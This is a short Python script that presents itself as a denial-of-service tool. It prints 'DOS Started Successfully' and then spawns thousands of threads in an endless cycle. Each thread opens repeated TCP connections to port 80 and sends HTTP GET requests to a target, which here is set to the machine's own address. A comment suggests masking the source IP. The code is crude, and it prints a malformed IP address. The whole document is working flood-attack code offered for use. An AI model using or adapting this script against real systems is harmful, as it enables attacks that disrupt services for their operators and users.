import socket
import threading
import random
import sys, errno


target = socket.gethostbyname(socket.gethostname()) 
ip = 'localhost' #change to mask id 
port = 80
print("http://151.30.04.1/")
print("DOS Started Successfully")
def attack():
  while 0<1:
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((target, port))
      s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
      s.sendto(("Host: " + ip + "\r\n\r\n").encode('ascii'), (target, port))
      
      s.close()
    # except IOError as e:
    #   if e.errno == errno.EPIPE:
	   #    pass

i = 0
while (i<2000):
    thread = threading.Thread(target=attack)
    thread.start()
    i+=1
    if (i > 1950):
      i = 0